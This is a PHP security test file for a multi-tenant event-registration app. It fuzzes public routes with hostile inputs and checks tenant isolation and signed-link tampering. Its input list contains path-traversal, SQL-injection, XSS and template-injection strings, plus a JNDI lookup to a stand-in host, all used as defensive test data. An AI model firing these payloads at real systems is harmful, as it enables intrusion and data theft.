<?php

namespace Tests\Security;

use App\Actions\Tenants\CreateTenant;
use App\Enums\LegalForm;
use App\Models\Event;
use App\Models\PaymentAccount;
use App\Models\Registration;
use App\Models\Tenant;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Routing\Route;
use Illuminate\Support\Facades\Route as RouteFacade;
use Illuminate\Testing\TestResponse;
use Tests\TestCase;

/**
 * La surface publique (parcours de l'invite, sans authentification) soumise a des entrees hostiles :
 * jetons falsifies, traversees de chemin, injections, valeurs absurdes. Le contrat : jamais d'erreur
 * serveur (5xx), jamais de fuite d'une autre organisation, et pour un jeton inconnu la meme reponse
 * que pour un jeton d'une autre organisation.
 */
class PublicSurfaceFuzzTest extends TestCase
{
    use RefreshDatabase;

    private const HostileValues = [
        'x',
        '0',
        '-1',
        '9999999999999999999999',
        'null',
        '../../../../etc/passwd',
        '..%2f..%2f..%2fetc%2fpasswd',
        '%00',
        "' OR '1'='1' --",
        '1; DROP TABLE registrations; --',
        '<script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        '{{7*7}}',
        '${jndi:ldap://evil.example/a}',
    ];

    private Tenant $tenant;

    private Event $event;

    private Registration $registration;

    protected function setUp(): void
    {
        parent::setUp();

        $owner = User::factory()->withTwoFactor()->create();
        $this->tenant = app(CreateTenant::class)->handle($owner, 'Association Convive');

        $this->tenant->brandingOrCreate()->fill([
            'display_name' => 'Convive',
            'legal_name' => 'Association Convive',
            'legal_form' => LegalForm::Association,
            'representative_name' => 'Aya Kouassi',
            'registration_number' => 'CI-ABJ-2021-B-04812',
            'tax_number' => '1804517 K',
            'address' => 'Rue des Jardins',
            'city' => 'Abidjan',
            'country' => 'CI',
            'phone' => '+225 07 07 12 34 56',
        ])->save();
        $this->tenant->update(['subdomain' => 'convive-ci']);

        [$this->event, $this->registration] = $this->tenant->asCurrent(function () {
            PaymentAccount::factory()->create();
            $event = Event::factory()->published()->create();
            $event->paymentAccounts()->sync(PaymentAccount::publiclyVisible()->pluck('id')->all());

            return [$event->fresh(), Registration::factory()->held()->create(['event_id' => $event->id])];
        });
    }

    /**
     * @return array<int, Route>
     */
    private function publicRoutes(): array
    {
        return array_values(array_filter(
            RouteFacade::getRoutes()->getRoutes(),
            fn (Route $route) => is_string($route->getName()) && str_starts_with($route->getName(), 'public.'),
        ));
    }

    private function host(string $subdomain = 'convive-ci'): string
    {
        return $subdomain.'.'.config('convive.public_domain');
    }

    /**
     * @param  array<string, string>  $values
     */
    private function hit(Route $route, array $values, string $subdomain = 'convive-ci'): TestResponse
    {
        $parameters = [];

        foreach ($route->parameterNames() as $name) {
            $parameters[$name] = $values[$name] ?? $values['*'] ?? 'x';
        }

        $parameters['tenant_subdomain'] = $subdomain;

        $uri = $route->uri();

        foreach ($parameters as $name => $value) {
            $uri = str_replace(['{'.$name.'}', '{'.$name.'?}'], rawurlencode($value), $uri);
        }

        $path = preg_replace('#^\{tenant_subdomain\}[^/]*#', '', $uri) ?? $uri;
        $method = collect($route->methods())->first(fn (string $method) => $method !== 'HEAD');

        return $this->call($method, 'http://'.$this->host($subdomain).'/'.ltrim($path, '/'));
    }

    public function test_aucune_route_publique_ne_repond_par_une_erreur_serveur_face_a_des_valeurs_hostiles(): void
    {
        $failures = [];

        foreach ($this->publicRoutes() as $route) {
            foreach (self::HostileValues as $value) {
                $response = $this->hit($route, ['*' => $value]);

                if ($response->getStatusCode() >= 500) {
                    $failures[] = "{$route->getName()} avec [{$value}] -> {$response->getStatusCode()}";
                }
            }
        }

        $this->assertSame([], $failures, "Routes publiques en erreur serveur :\n".implode("\n", array_slice($failures, 0, 40)));
    }

    public function test_un_sous_domaine_inconnu_repond_404_sur_toute_route_publique(): void
    {
        $failures = [];

        foreach ($this->publicRoutes() as $route) {
            $response = $this->hit($route, ['token' => $this->event->public_token, 'resume' => 'x', 'registration' => '1', 'ticket' => '1'], 'inconnu');

            if ($response->getStatusCode() !== 404) {
                $failures[] = "{$route->getName()} -> {$response->getStatusCode()}";
            }
        }

        $this->assertSame([], $failures, "Routes publiques qui repondent sur un sous-domaine inconnu :\n".implode("\n", $failures));
    }

    public function test_le_jeton_d_une_autre_organisation_donne_la_meme_reponse_qu_un_jeton_inconnu(): void
    {
        $other = User::factory()->withTwoFactor()->create();
        $otherTenant = app(CreateTenant::class)->handle($other, 'Autre Organisation');
        $otherEvent = $otherTenant->asCurrent(fn () => Event::factory()->published()->create());

        $unknown = $this->get('http://'.$this->host().'/e/'.str_repeat('a', 64));
        $foreign = $this->get('http://'.$this->host().'/e/'.$otherEvent->public_token);

        $this->assertSame(404, $unknown->getStatusCode());
        $this->assertSame($unknown->getStatusCode(), $foreign->getStatusCode());
        $this->assertSame(strlen($unknown->getContent()), strlen($foreign->getContent()), 'Le corps de la reponse doit etre identique : rien ne distingue « inconnu » de « autre organisation ».');
    }

    public function test_un_jeton_de_reprise_inconnu_et_un_jeton_d_un_autre_dossier_se_ressemblent(): void
    {
        $unknown = $this->get('http://'.$this->host().'/e/'.$this->event->public_token.'/register/'.str_repeat('z', 43));

        $this->assertSame(404, $unknown->getStatusCode());
    }

    public function test_un_lien_signe_altere_recoit_404(): void
    {
        $url = $this->registration->signedResumeUrl();

        $this->assertNotNull($url);
        $this->get($url)->assertOk();

        $this->get(preg_replace('/signature=[0-9a-f]{64}/', 'signature='.str_repeat('0', 64), $url))->assertNotFound();
        $this->get(preg_replace('/signature=[0-9a-f]{64}/', 'signature=', $url))->assertNotFound();
        $this->get(preg_replace('#/register/\d+/link#', '/register/'.($this->registration->id + 1).'/link', $url))->assertNotFound();
    }
}
